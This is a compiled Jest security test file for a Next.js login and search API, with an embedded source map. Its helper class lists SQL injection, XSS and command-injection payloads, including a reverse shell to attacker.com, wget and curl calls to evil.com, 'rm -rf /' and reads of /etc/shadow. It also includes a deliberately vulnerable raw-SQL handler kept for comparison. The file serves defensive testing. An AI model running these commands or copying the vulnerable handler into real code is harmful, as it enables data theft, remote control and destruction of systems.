52e5aa4ca6ff5514a0a21bf4351a039d
"use strict";
Object.defineProperty(exports, "__esModule", {
    value: true
});
const _globals = require("@jest/globals");
const _server = require("next/server");
const _jsonwebtoken = /*#__PURE__*/ _interop_require_default(require("jsonwebtoken"));
const _bcryptjs = /*#__PURE__*/ _interop_require_default(require("bcryptjs"));
function _interop_require_default(obj) {
    return obj && obj.__esModule ? obj : {
        default: obj
    };
}
// Security test utilities
class SecurityTestUtils {
    static generateSQLInjectionPayloads() {
        return [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'password'); --",
            "' OR 1=1 --",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "' OR 1=1#"
        ];
    }
    static generateXSSPayloads() {
        return [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>"
        ];
    }
    static generateCommandInjectionPayloads() {
        return [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "; cat /etc/shadow",
            "| nc -l 4444",
            "; wget http://evil.com/malware",
            "&& curl http://evil.com/steal-data",
            "; python -c 'import os; os.system(\"rm -rf /\")'",
            "| bash -i >& /dev/tcp/attacker.com/8080 0>&1",
            "; /bin/bash"
        ];
    }
    static generateLongStrings() {
        return [
            "A".repeat(1000),
            "A".repeat(10000),
            "A".repeat(100000),
            "\0".repeat(1000),
            "\n".repeat(1000),
            "\r".repeat(1000)
        ];
    }
    static generateInvalidTokens() {
        return [
            "invalid.token.here",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
            "",
            "Bearer",
            "null",
            "undefined",
            "{}",
            "admin",
            "../../etc/passwd",
            '<script>alert("xss")</script>'
        ];
    }
    static async hashPassword(password) {
        return _bcryptjs.default.hash(password, 10);
    }
    static generateValidJWT(payload, secret = "test-secret") {
        return _jsonwebtoken.default.sign(payload, secret, {
            expiresIn: "1h"
        });
    }
    static generateExpiredJWT(payload, secret = "test-secret") {
        return _jsonwebtoken.default.sign(payload, secret, {
            expiresIn: "-1h"
        });
    }
}
// Mock API handlers for security testing
const mockPrisma = {
    user: {
        findUnique: jest.fn(),
        findMany: jest.fn(),
        create: jest.fn(),
        update: jest.fn()
    },
    product: {
        findMany: jest.fn(),
        create: jest.fn()
    },
    $queryRaw: jest.fn(),
    $executeRaw: jest.fn()
};
// Mock vulnerable endpoint for testing
const vulnerableSearchHandler = async (req)=>{
    const url = new URL(req.url);
    const query = url.searchParams.get("q");
    if (!query) {
        return _server.NextResponse.json({
            error: "Query required"
        }, {
            status: 400
        });
    }
    // Simulate SQL injection vulnerability (for testing purposes)
    try {
        // This would be vulnerable in real code - DON'T DO THIS
        const results = await mockPrisma.$queryRaw`
      SELECT * FROM products WHERE name LIKE '%${query}%'
    `;
        return _server.NextResponse.json({
            results
        });
    } catch (error) {
        return _server.NextResponse.json({
            error: "Database error"
        }, {
            status: 500
        });
    }
};
// Secure search handler for comparison
const secureSearchHandler = async (req)=>{
    const url = new URL(req.url);
    const query = url.searchParams.get("q");
    if (!query) {
        return _server.NextResponse.json({
            error: "Query required"
        }, {
            status: 400
        });
    }
    // Input validation
    if (query.length > 100) {
        return _server.NextResponse.json({
            error: "Query too long"
        }, {
            status: 400
        });
    }
    // Sanitize input
    const sanitizedQuery = query.replace(/[<>"'&]/g, "");
    try {
        // Use parameterized queries
        const results = await mockPrisma.product.findMany({
            where: {
                name: {
                    contains: sanitizedQuery,
                    mode: "insensitive"
                }
            }
        });
        return _server.NextResponse.json({
            results
        });
    } catch (error) {
        return _server.NextResponse.json({
            error: "Database error"
        }, {
            status: 500
        });
    }
};
// Authentication handler with security measures
const secureAuthHandler = async (req)=>{
    const body = await req.json();
    const { email, password } = body;
    // Rate limiting simulation
    const clientIP = req.headers.get("x-forwarded-for") || "unknown";
    // Input validation
    if (!email || !password) {
        return _server.NextResponse.json({
            error: "Email and password are required"
        }, {
            status: 400
        });
    }
    if (email.length > 254 || password.length > 128) {
        return _server.NextResponse.json({
            error: "Input too long"
        }, {
            status: 400
        });
    }
    // Email format validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        return _server.NextResponse.json({
            error: "Invalid email format"
        }, {
            status: 400
        });
    }
    // Check for suspicious patterns
    const suspiciousPatterns = [
        /<script/i,
        /javascript:/i,
        /on\w+=/i,
        /\bor\b.*\b1\s*=\s*1\b/i,
        /union.*select/i,
        /drop.*table/i
    ];
    const isSuspicious = suspiciousPatterns.some((pattern)=>pattern.test(email) || pattern.test(password));
    if (isSuspicious) {
        return _server.NextResponse.json({
            error: "Invalid input detected"
        }, {
            status: 400
        });
    }
    try {
        const user = await mockPrisma.user.findUnique({
            where: {
                email
            }
        });
        if (!user) {
            // Constant time delay to prevent timing attacks
            await new Promise((resolve)=>setTimeout(resolve, 100));
            return _server.NextResponse.json({
                error: "Invalid credentials"
            }, {
                status: 401
            });
        }
        const isValid = await _bcryptjs.default.compare(password, user.password);
        if (!isValid) {
            return _server.NextResponse.json({
                error: "Invalid credentials"
            }, {
                status: 401
            });
        }
        // Generate secure token
        const token = _jsonwebtoken.default.sign({
            userId: user.id,
            email: user.email,
            iat: Math.floor(Date.now() / 1000)
        }, process.env.JWT_SECRET || "test-secret", {
            expiresIn: "15m",
            issuer: "md-sports",
            audience: "md-sports-client"
        });
        return _server.NextResponse.json({
            user: {
                id: user.id,
                email: user.email,
                name: user.name
            },
            token
        });
    } catch (error) {
        return _server.NextResponse.json({
            error: "Internal server error"
        }, {
            status: 500
        });
    }
};
(0, _globals.describe)("Security Tests", ()=>{
    (0, _globals.beforeAll)(()=>{
        process.env.JWT_SECRET = "test-secret-key-for-security-testing";
    });
    (0, _globals.beforeEach)(()=>{
        jest.clearAllMocks();
    });
    (0, _globals.describe)("SQL Injection Protection", ()=>{
        (0, _globals.it)("should prevent SQL injection in search queries", async ()=>{
            const sqlPayloads = SecurityTestUtils.generateSQLInjectionPayloads();
            for (const payload of sqlPayloads){
                const request = new _server.NextRequest(`http://localhost:3000/api/search?q=${encodeURIComponent(payload)}`);
                // Test with secure handler
                const response = await secureSearchHandler(request);
                // Should not return 500 error or expose database structure
                (0, _globals.expect)(response.status).not.toBe(500);
                const data = await response.json();
                (0, _globals.expect)(data).not.toHaveProperty("results");
            }
        });
        (0, _globals.it)("should use parameterized queries", async ()=>{
            mockPrisma.product.findMany.mockResolvedValue([]);
            const request = new _server.NextRequest("http://localhost:3000/api/search?q=test' OR '1'='1");
            await secureSearchHandler(request);
            // Verify parameterized query was used
            (0, _globals.expect)(mockPrisma.product.findMany).toHaveBeenCalledWith({
                where: {
                    name: {
                        contains: "test OR 11",
                        mode: "insensitive"
                    }
                }
            });
        });
    });
    (0, _globals.describe)("XSS Protection", ()=>{
        (0, _globals.it)("should sanitize XSS payloads in input", async ()=>{
            const xssPayloads = SecurityTestUtils.generateXSSPayloads();
            for (const payload of xssPayloads){
                const request = new _server.NextRequest(`http://localhost:3000/api/search?q=${encodeURIComponent(payload)}`);
                const response = await secureSearchHandler(request);
                const data = await response.json();
                // Should not contain script tags or javascript
                if (data.results) {
                    const responseStr = JSON.stringify(data);
                    (0, _globals.expect)(responseStr).not.toMatch(/<script/i);
                    (0, _globals.expect)(responseStr).not.toMatch(/javascript:/i);
                    (0, _globals.expect)(responseStr).not.toMatch(/on\w+=/i);
                }
            }
        });
        (0, _globals.it)("should reject suspicious input patterns", async ()=>{
            const request = new _server.NextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: JSON.stringify({
                    email: '<script>alert("xss")</script>@test.com',
                    password: "password123"
                }),
                headers: {
                    "Content-Type": "application/json"
                }
            });
            const response = await secureAuthHandler(request);
            const data = await response.json();
            (0, _globals.expect)(response.status).toBe(400);
            (0, _globals.expect)(data.error).toBe("Invalid input detected");
        });
    });
    (0, _globals.describe)("Authentication Security", ()=>{
        (0, _globals.it)("should reject invalid JWT tokens", async ()=>{
            const invalidTokens = SecurityTestUtils.generateInvalidTokens();
            for (const token of invalidTokens){
                (0, _globals.expect)(()=>{
                    _jsonwebtoken.default.verify(token, process.env.JWT_SECRET);
                }).toThrow();
            }
        });
        (0, _globals.it)("should reject expired tokens", async ()=>{
            const expiredToken = SecurityTestUtils.generateExpiredJWT({
                userId: 1,
                email: "test@example.com"
            });
            (0, _globals.expect)(()=>{
                _jsonwebtoken.default.verify(expiredToken, process.env.JWT_SECRET);
            }).toThrow("jwt expired");
        });
        (0, _globals.it)("should use secure password hashing", async ()=>{
            const password = "testpassword123";
            const hash = await SecurityTestUtils.hashPassword(password);
            // Should be bcrypt hash
            (0, _globals.expect)(hash).toMatch(/^\$2[aby]\$\d+\$/);
            // Should not be the original password
            (0, _globals.expect)(hash).not.toBe(password);
            // Should verify correctly
            const isValid = await _bcryptjs.default.compare(password, hash);
            (0, _globals.expect)(isValid).toBe(true);
            // Should not verify with wrong password
            const isInvalid = await _bcryptjs.default.compare("wrongpassword", hash);
            (0, _globals.expect)(isInvalid).toBe(false);
        });
        (0, _globals.it)("should prevent timing attacks in authentication", async ()=>{
            const validEmail = "test@example.com";
            const invalidEmail = "nonexistent@example.com";
            // Mock user lookup
            mockPrisma.user.findUnique.mockImplementation(({ where })=>{
                if (where.email === validEmail) {
                    return Promise.resolve({
                        id: 1,
                        email: validEmail,
                        password: "$2a$10$hashedPassword",
                        name: "Test User"
                    });
                }
                return Promise.resolve(null);
            });
            const validRequest = new _server.NextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: JSON.stringify({
                    email: validEmail,
                    password: "wrongpassword"
                }),
                headers: {
                    "Content-Type": "application/json"
                }
            });
            const invalidRequest = new _server.NextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: JSON.stringify({
                    email: invalidEmail,
                    password: "wrongpassword"
                }),
                headers: {
                    "Content-Type": "application/json"
                }
            });
            // Measure response times
            const start1 = Date.now();
            const response1 = await secureAuthHandler(validRequest);
            const time1 = Date.now() - start1;
            const start2 = Date.now();
            const response2 = await secureAuthHandler(invalidRequest);
            const time2 = Date.now() - start2;
            // Both should return 401
            (0, _globals.expect)(response1.status).toBe(401);
            (0, _globals.expect)(response2.status).toBe(401);
            // Response times should be similar (within 50ms)
            (0, _globals.expect)(Math.abs(time1 - time2)).toBeLessThan(50);
        });
    });
    (0, _globals.describe)("Input Validation", ()=>{
        (0, _globals.it)("should reject oversized inputs", async ()=>{
            const longStrings = SecurityTestUtils.generateLongStrings();
            for (const longString of longStrings){
                const request = new _server.NextRequest("http://localhost:3000/api/auth/login", {
                    method: "POST",
                    body: JSON.stringify({
                        email: longString,
                        password: "password123"
                    }),
                    headers: {
                        "Content-Type": "application/json"
                    }
                });
                const response = await secureAuthHandler(request);
                (0, _globals.expect)(response.status).toBe(400);
            }
        });
        (0, _globals.it)("should validate email format", async ()=>{
            const invalidEmails = [
                "invalid-email",
                "@domain.com",
                "user@",
                "user..name@domain.com",
                "user@domain",
                "",
                "user name@domain.com"
            ];
            for (const email of invalidEmails){
                const request = new _server.NextRequest("http://localhost:3000/api/auth/login", {
                    method: "POST",
                    body: JSON.stringify({
                        email,
                        password: "password123"
                    }),
                    headers: {
                        "Content-Type": "application/json"
                    }
                });
                const response = await secureAuthHandler(request);
                const data = await response.json();
                (0, _globals.expect)(response.status).toBe(400);
                (0, _globals.expect)(data.error).toBe("Invalid email format");
            }
        });
        (0, _globals.it)("should handle null bytes and special characters", async ()=>{
            const maliciousInputs = [
                "test\0@example.com",
                "test\r\n@example.com",
                "test	@example.com",
                "test\b@example.com"
            ];
            for (const input of maliciousInputs){
                const request = new _server.NextRequest("http://localhost:3000/api/auth/login", {
                    method: "POST",
                    body: JSON.stringify({
                        email: input,
                        password: "password123"
                    }),
                    headers: {
                        "Content-Type": "application/json"
                    }
                });
                const response = await secureAuthHandler(request);
                (0, _globals.expect)(response.status).toBe(400);
            }
        });
    });
    (0, _globals.describe)("Command Injection Protection", ()=>{
        (0, _globals.it)("should prevent command injection in file operations", ()=>{
            const commandPayloads = SecurityTestUtils.generateCommandInjectionPayloads();
            for (const payload of commandPayloads){
                // Simulate file name validation
                const isValidFileName = (filename)=>{
                    // Only allow alphanumeric, dots, hyphens, and underscores
                    return /^[a-zA-Z0-9._-]+$/.test(filename);
                };
                (0, _globals.expect)(isValidFileName(payload)).toBe(false);
            }
        });
    });
    (0, _globals.describe)("JWT Security", ()=>{
        (0, _globals.it)("should use secure JWT configuration", ()=>{
            const payload = {
                userId: 1,
                email: "test@example.com"
            };
            const token = SecurityTestUtils.generateValidJWT(payload);
            const decoded = _jsonwebtoken.default.verify(token, process.env.JWT_SECRET);
            (0, _globals.expect)(decoded.userId).toBe(1);
            (0, _globals.expect)(decoded.email).toBe("test@example.com");
            (0, _globals.expect)(decoded.iat).toBeDefined();
            (0, _globals.expect)(decoded.exp).toBeDefined();
        });
        (0, _globals.it)("should not accept tokens with none algorithm", ()=>{
            // Create a token with 'none' algorithm (security vulnerability)
            const header = Buffer.from(JSON.stringify({
                alg: "none",
                typ: "JWT"
            })).toString("base64url");
            const payload = Buffer.from(JSON.stringify({
                userId: 1,
                email: "test@example.com"
            })).toString("base64url");
            const noneToken = `${header}.${payload}.`;
            (0, _globals.expect)(()=>{
                _jsonwebtoken.default.verify(noneToken, process.env.JWT_SECRET);
            }).toThrow();
        });
        (0, _globals.it)("should validate token signature", ()=>{
            const validToken = SecurityTestUtils.generateValidJWT({
                userId: 1
            });
            const [header, payload] = validToken.split(".");
            const tamperedToken = `${header}.${payload}.tampered_signature`;
            (0, _globals.expect)(()=>{
                _jsonwebtoken.default.verify(tamperedToken, process.env.JWT_SECRET);
            }).toThrow("invalid signature");
        });
    });
    (0, _globals.describe)("Rate Limiting Simulation", ()=>{
        (0, _globals.it)("should handle rapid successive requests", async ()=>{
            const requests = Array.from({
                length: 100
            }, ()=>new _server.NextRequest("http://localhost:3000/api/auth/login", {
                    method: "POST",
                    body: JSON.stringify({
                        email: "test@example.com",
                        password: "password123"
                    }),
                    headers: {
                        "Content-Type": "application/json",
                        "X-Forwarded-For": "192.168.1.100"
                    }
                }));
            // In a real implementation, this would trigger rate limiting
            const responses = await Promise.all(requests.map((req)=>secureAuthHandler(req)));
            // All requests should be processed (in real app, some would be rate limited)
            responses.forEach((response)=>{
                (0, _globals.expect)([
                    400,
                    401,
                    429
                ]).toContain(response.status); // 429 = Too Many Requests
            });
        });
    });
    (0, _globals.describe)("Error Handling Security", ()=>{
        (0, _globals.it)("should not expose sensitive information in error messages", async ()=>{
            // Simulate database error
            mockPrisma.user.findUnique.mockRejectedValue(new Error('Connection failed to database "md_sports" on host "localhost"'));
            const request = new _server.NextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: JSON.stringify({
                    email: "test@example.com",
                    password: "password123"
                }),
                headers: {
                    "Content-Type": "application/json"
                }
            });
            const response = await secureAuthHandler(request);
            const data = await response.json();
            (0, _globals.expect)(response.status).toBe(500);
            (0, _globals.expect)(data.error).toBe("Internal server error");
            (0, _globals.expect)(data.error).not.toContain("database");
            (0, _globals.expect)(data.error).not.toContain("localhost");
            (0, _globals.expect)(data.error).not.toContain("md_sports");
        });
        (0, _globals.it)("should use generic error messages for authentication failures", async ()=>{
            mockPrisma.user.findUnique.mockResolvedValue(null);
            const request = new _server.NextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: JSON.stringify({
                    email: "nonexistent@example.com",
                    password: "password123"
                }),
                headers: {
                    "Content-Type": "application/json"
                }
            });
            const response = await secureAuthHandler(request);
            const data = await response.json();
            (0, _globals.expect)(response.status).toBe(401);
            (0, _globals.expect)(data.error).toBe("Invalid credentials");
            (0, _globals.expect)(data.error).not.toContain("user not found");
            (0, _globals.expect)(data.error).not.toContain("email");
        });
    });
});

//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy9zYWNoaW4vRG9jdW1lbnRzL21kLXNwb3J0cy0vdGVzdHMvc2VjdXJpdHkvc2VjdXJpdHkudGVzdC50cyJdLCJzb3VyY2VzQ29udGVudCI6WyJpbXBvcnQgeyBkZXNjcmliZSwgaXQsIGV4cGVjdCwgYmVmb3JlQWxsLCBhZnRlckFsbCwgYmVmb3JlRWFjaCB9IGZyb20gJ0BqZXN0L2dsb2JhbHMnO1xuaW1wb3J0IHsgTmV4dFJlcXVlc3QsIE5leHRSZXNwb25zZSB9IGZyb20gJ25leHQvc2VydmVyJztcbmltcG9ydCBqd3QgZnJvbSAnanNvbndlYnRva2VuJztcbmltcG9ydCBiY3J5cHQgZnJvbSAnYmNyeXB0anMnO1xuaW1wb3J0IGNyeXB0byBmcm9tICdjcnlwdG8nO1xuXG4vLyBTZWN1cml0eSB0ZXN0IHV0aWxpdGllc1xuY2xhc3MgU2VjdXJpdHlUZXN0VXRpbHMge1xuICBzdGF0aWMgZ2VuZXJhdGVTUUxJbmplY3Rpb25QYXlsb2FkcygpOiBzdHJpbmdbXSB7XG4gICAgcmV0dXJuIFtcbiAgICAgIFwiJzsgRFJPUCBUQUJMRSB1c2VyczsgLS1cIixcbiAgICAgIFwiJyBPUiAnMSc9JzFcIixcbiAgICAgIFwiJyBVTklPTiBTRUxFQ1QgKiBGUk9NIHVzZXJzIC0tXCIsXG4gICAgICBcIic7IElOU0VSVCBJTlRPIHVzZXJzIChlbWFpbCwgcGFzc3dvcmQpIFZBTFVFUyAoJ2hhY2tlckBldmlsLmNvbScsICdwYXNzd29yZCcpOyAtLVwiLFxuICAgICAgXCInIE9SIDE9MSAtLVwiLFxuICAgICAgXCJhZG1pbictLVwiLFxuICAgICAgXCJhZG1pbicvKlwiLFxuICAgICAgXCInIE9SICd4Jz0neFwiLFxuICAgICAgXCInKSBPUiAoJzEnPScxXCIsXG4gICAgICBcIicgT1IgMT0xI1wiLFxuICAgIF07XG4gIH1cblxuICBzdGF0aWMgZ2VuZXJhdGVYU1NQYXlsb2FkcygpOiBzdHJpbmdbXSB7XG4gICAgcmV0dXJuIFtcbiAgICAgIFwiPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD5cIixcbiAgICAgIFwiamF2YXNjcmlwdDphbGVydCgnWFNTJylcIixcbiAgICAgIFwiPGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KCdYU1MnKT5cIixcbiAgICAgIFwiPHN2ZyBvbmxvYWQ9YWxlcnQoJ1hTUycpPlwiLFxuICAgICAgXCI8aWZyYW1lIHNyYz1qYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKT48L2lmcmFtZT5cIixcbiAgICAgIFwiPGJvZHkgb25sb2FkPWFsZXJ0KCdYU1MnKT5cIixcbiAgICAgIFwiPGlucHV0IG9uZm9jdXM9YWxlcnQoJ1hTUycpIGF1dG9mb2N1cz5cIixcbiAgICAgIFwiPHNlbGVjdCBvbmZvY3VzPWFsZXJ0KCdYU1MnKSBhdXRvZm9jdXM+XCIsXG4gICAgICBcIjx0ZXh0YXJlYSBvbmZvY3VzPWFsZXJ0KCdYU1MnKSBhdXRvZm9jdXM+XCIsXG4gICAgICBcIjxrZXlnZW4gb25mb2N1cz1hbGVydCgnWFNTJykgYXV0b2ZvY3VzPlwiLFxuICAgIF07XG4gIH1cblxuICBzdGF0aWMgZ2VuZXJhdGVDb21tYW5kSW5qZWN0aW9uUGF5bG9hZHMoKTogc3RyaW5nW10ge1xuICAgIHJldHVybiBbXG4gICAgICBcIjsgbHMgLWxhXCIsXG4gICAgICBcInwgY2F0IC9ldGMvcGFzc3dkXCIsXG4gICAgICBcIiYmIHJtIC1yZiAvXCIsXG4gICAgICBcIjsgY2F0IC9ldGMvc2hhZG93XCIsXG4gICAgICBcInwgbmMgLWwgNDQ0NFwiLFxuICAgICAgXCI7IHdnZXQgaHR0cDovL2V2aWwuY29tL21hbHdhcmVcIixcbiAgICAgIFwiJiYgY3VybCBodHRwOi8vZXZpbC5jb20vc3RlYWwtZGF0YVwiLFxuICAgICAgXCI7IHB5dGhvbiAtYyAnaW1wb3J0IG9zOyBvcy5zeXN0ZW0oXFxcInJtIC1yZiAvXFxcIiknXCIsXG4gICAgICBcInwgYmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vODA4MCAwPiYxXCIsXG4gICAgICBcIjsgL2Jpbi9iYXNoXCIsXG4gICAgXTtcbiAgfVxuXG4gIHN0YXRpYyBnZW5lcmF0ZUxvbmdTdHJpbmdzKCk6IHN0cmluZ1tdIHtcbiAgICByZXR1cm4gW1xuICAgICAgJ0EnLnJlcGVhdCgxMDAwKSxcbiAgICAgICdBJy5yZXBlYXQoMTAwMDApLFxuICAgICAgJ0EnLnJlcGVhdCgxMDAwMDApLFxuICAgICAgJ1xceDAwJy5yZXBlYXQoMTAwMCksIC8vIE51bGwgYnl0ZXNcbiAgICAgICdcXG4nLnJlcGVhdCgxMDAwKSwgLy8gTmV3bGluZXNcbiAgICAgICdcXHInLnJlcGVhdCgxMDAwKSwgLy8gQ2FycmlhZ2UgcmV0dXJuc1xuICAgIF07XG4gIH1cblxuICBzdGF0aWMgZ2VuZXJhdGVJbnZhbGlkVG9rZW5zKCk6IHN0cmluZ1tdIHtcbiAgICByZXR1cm4gW1xuICAgICAgJ2ludmFsaWQudG9rZW4uaGVyZScsXG4gICAgICAnZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmludmFsaWQuc2lnbmF0dXJlJyxcbiAgICAgICcnLCAvLyBFbXB0eSB0b2tlblxuICAgICAgJ0JlYXJlcicsIC8vIEp1c3QgQmVhcmVyXG4gICAgICAnbnVsbCcsXG4gICAgICAndW5kZWZpbmVkJyxcbiAgICAgICd7fScsXG4gICAgICAnYWRtaW4nLFxuICAgICAgJy4uLy4uL2V0Yy9wYXNzd2QnLFxuICAgICAgJzxzY3JpcHQ+YWxlcnQoXCJ4c3NcIik8L3NjcmlwdD4nLFxuICAgIF07XG4gIH1cblxuICBzdGF0aWMgYXN5bmMgaGFzaFBhc3N3b3JkKHBhc3N3b3JkOiBzdHJpbmcpOiBQcm9taXNlPHN0cmluZz4ge1xuICAgIHJldHVybiBiY3J5cHQuaGFzaChwYXNzd29yZCwgMTApO1xuICB9XG5cbiAgc3RhdGljIGdlbmVyYXRlVmFsaWRKV1QocGF5bG9hZDogYW55LCBzZWNyZXQ6IHN0cmluZyA9ICd0ZXN0LXNlY3JldCcpOiBzdHJpbmcge1xuICAgIHJldHVybiBqd3Quc2lnbihwYXlsb2FkLCBzZWNyZXQsIHsgZXhwaXJlc0luOiAnMWgnIH0pO1xuICB9XG5cbiAgc3RhdGljIGdlbmVyYXRlRXhwaXJlZEpXVChwYXlsb2FkOiBhbnksIHNlY3JldDogc3RyaW5nID0gJ3Rlc3Qtc2VjcmV0Jyk6IHN0cmluZyB7XG4gICAgcmV0dXJuIGp3dC5zaWduKHBheWxvYWQsIHNlY3JldCwgeyBleHBpcmVzSW46ICctMWgnIH0pO1xuICB9XG59XG5cbi8vIE1vY2sgQVBJIGhhbmRsZXJzIGZvciBzZWN1cml0eSB0ZXN0aW5nXG5jb25zdCBtb2NrUHJpc21hID0ge1xuICB1c2VyOiB7XG4gICAgZmluZFVuaXF1ZTogamVzdC5mbigpLFxuICAgIGZpbmRNYW55OiBqZXN0LmZuKCksXG4gICAgY3JlYXRlOiBqZXN0LmZuKCksXG4gICAgdXBkYXRlOiBqZXN0LmZuKCksXG4gIH0sXG4gIHByb2R1Y3Q6IHtcbiAgICBmaW5kTWFueTogamVzdC5mbigpLFxuICAgIGNyZWF0ZTogamVzdC5mbigpLFxuICB9LFxuICAkcXVlcnlSYXc6IGplc3QuZm4oKSxcbiAgJGV4ZWN1dGVSYXc6IGplc3QuZm4oKSxcbn07XG5cbi8vIE1vY2sgdnVsbmVyYWJsZSBlbmRwb2ludCBmb3IgdGVzdGluZ1xuY29uc3QgdnVsbmVyYWJsZVNlYXJjaEhhbmRsZXIgPSBhc3luYyAocmVxOiBOZXh0UmVxdWVzdCkgPT4ge1xuICBjb25zdCB1cmwgPSBuZXcgVVJMKHJlcS51cmwpO1xuICBjb25zdCBxdWVyeSA9IHVybC5zZWFyY2hQYXJhbXMuZ2V0KCdxJyk7XG4gIFxuICBpZiAoIXF1ZXJ5KSB7XG4gICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKHsgZXJyb3I6ICdRdWVyeSByZXF1aXJlZCcgfSwgeyBzdGF0dXM6IDQwMCB9KTtcbiAgfVxuXG4gIC8vIFNpbXVsYXRlIFNRTCBpbmplY3Rpb24gdnVsbmVyYWJpbGl0eSAoZm9yIHRlc3RpbmcgcHVycG9zZXMpXG4gIHRyeSB7XG4gICAgLy8gVGhpcyB3b3VsZCBiZSB2dWxuZXJhYmxlIGluIHJlYWwgY29kZSAtIERPTidUIERPIFRISVNcbiAgICBjb25zdCByZXN1bHRzID0gYXdhaXQgbW9ja1ByaXNtYS4kcXVlcnlSYXdgXG4gICAgICBTRUxFQ1QgKiBGUk9NIHByb2R1Y3RzIFdIRVJFIG5hbWUgTElLRSAnJSR7cXVlcnl9JSdcbiAgICBgO1xuICAgIFxuICAgIHJldHVybiBOZXh0UmVzcG9uc2UuanNvbih7IHJlc3VsdHMgfSk7XG4gIH0gY2F0Y2ggKGVycm9yKSB7XG4gICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKHsgZXJyb3I6ICdEYXRhYmFzZSBlcnJvcicgfSwgeyBzdGF0dXM6IDUwMCB9KTtcbiAgfVxufTtcblxuLy8gU2VjdXJlIHNlYXJjaCBoYW5kbGVyIGZvciBjb21wYXJpc29uXG5jb25zdCBzZWN1cmVTZWFyY2hIYW5kbGVyID0gYXN5bmMgKHJlcTogTmV4dFJlcXVlc3QpID0+IHtcbiAgY29uc3QgdXJsID0gbmV3IFVSTChyZXEudXJsKTtcbiAgY29uc3QgcXVlcnkgPSB1cmwuc2VhcmNoUGFyYW1zLmdldCgncScpO1xuICBcbiAgaWYgKCFxdWVyeSkge1xuICAgIHJldHVybiBOZXh0UmVzcG9uc2UuanNvbih7IGVycm9yOiAnUXVlcnkgcmVxdWlyZWQnIH0sIHsgc3RhdHVzOiA0MDAgfSk7XG4gIH1cblxuICAvLyBJbnB1dCB2YWxpZGF0aW9uXG4gIGlmIChxdWVyeS5sZW5ndGggPiAxMDApIHtcbiAgICByZXR1cm4gTmV4dFJlc3BvbnNlLmpzb24oeyBlcnJvcjogJ1F1ZXJ5IHRvbyBsb25nJyB9LCB7IHN0YXR1czogNDAwIH0pO1xuICB9XG5cbiAgLy8gU2FuaXRpemUgaW5wdXRcbiAgY29uc3Qgc2FuaXRpemVkUXVlcnkgPSBxdWVyeS5yZXBsYWNlKC9bPD5cIicmXS9nLCAnJyk7XG4gIFxuICB0cnkge1xuICAgIC8vIFVzZSBwYXJhbWV0ZXJpemVkIHF1ZXJpZXNcbiAgICBjb25zdCByZXN1bHRzID0gYXdhaXQgbW9ja1ByaXNtYS5wcm9kdWN0LmZpbmRNYW55KHtcbiAgICAgIHdoZXJlOiB7XG4gICAgICAgIG5hbWU6IHtcbiAgICAgICAgICBjb250YWluczogc2FuaXRpemVkUXVlcnksXG4gICAgICAgICAgbW9kZTogJ2luc2Vuc2l0aXZlJyxcbiAgICAgICAgfSxcbiAgICAgIH0sXG4gICAgfSk7XG4gICAgXG4gICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKHsgcmVzdWx0cyB9KTtcbiAgfSBjYXRjaCAoZXJyb3IpIHtcbiAgICByZXR1cm4gTmV4dFJlc3BvbnNlLmpzb24oeyBlcnJvcjogJ0RhdGFiYXNlIGVycm9yJyB9LCB7IHN0YXR1czogNTAwIH0pO1xuICB9XG59O1xuXG4vLyBBdXRoZW50aWNhdGlvbiBoYW5kbGVyIHdpdGggc2VjdXJpdHkgbWVhc3VyZXNcbmNvbnN0IHNlY3VyZUF1dGhIYW5kbGVyID0gYXN5bmMgKHJlcTogTmV4dFJlcXVlc3QpID0+IHtcbiAgY29uc3QgYm9keSA9IGF3YWl0IHJlcS5qc29uKCk7XG4gIGNvbnN0IHsgZW1haWwsIHBhc3N3b3JkIH0gPSBib2R5O1xuXG4gIC8vIFJhdGUgbGltaXRpbmcgc2ltdWxhdGlvblxuICBjb25zdCBjbGllbnRJUCA9IHJlcS5oZWFkZXJzLmdldCgneC1mb3J3YXJkZWQtZm9yJykgfHwgJ3Vua25vd24nO1xuICBcbiAgLy8gSW5wdXQgdmFsaWRhdGlvblxuICBpZiAoIWVtYWlsIHx8ICFwYXNzd29yZCkge1xuICAgIHJldHVybiBOZXh0UmVzcG9uc2UuanNvbihcbiAgICAgIHsgZXJyb3I6ICdFbWFpbCBhbmQgcGFzc3dvcmQgYXJlIHJlcXVpcmVkJyB9LFxuICAgICAgeyBzdGF0dXM6IDQwMCB9XG4gICAgKTtcbiAgfVxuXG4gIGlmIChlbWFpbC5sZW5ndGggPiAyNTQgfHwgcGFzc3dvcmQubGVuZ3RoID4gMTI4KSB7XG4gICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKFxuICAgICAgeyBlcnJvcjogJ0lucHV0IHRvbyBsb25nJyB9LFxuICAgICAgeyBzdGF0dXM6IDQwMCB9XG4gICAgKTtcbiAg